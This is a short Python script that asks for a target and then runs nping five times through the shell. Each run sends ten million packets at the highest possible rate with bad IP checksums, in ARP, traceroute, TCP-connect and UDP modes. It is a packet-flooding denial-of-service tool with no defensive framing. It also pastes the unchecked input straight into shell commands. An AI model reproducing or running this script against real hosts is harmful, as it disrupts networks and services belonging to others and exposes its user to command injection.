import socket
import os
clear = lambda: os.system('clear')
clear()
print("")
print("")
print("")
f = input("[$]:")
l = ("nping " + f + " -v4 -d3 -H -c 10000000 --arp --rate 999999999 --badsum-ip --debug")
os.system(l)
l1 = ("nping " + f + " -v4 -d3 -H -c 10000000 --tr --rate 999999999 --badsum-ip --debug")
os.system(l1)
l2 = ("nping " + f + " -v4 -d3 -H -c 10000000 --tcp-connect --rate 999999999 --badsum-ip --debug")
os.system(l2)
l3 = ("nping " + f + " -v4 -d3 -H -c 10000000 --tr --rate 999999999 --badsum-ip --debug")
os.system(l3)
l4 = ("nping " + f + " -v4 -d3 -H -c 10000000 --udp --rate 999999999 --badsum-ip --debug")
os.system(l4)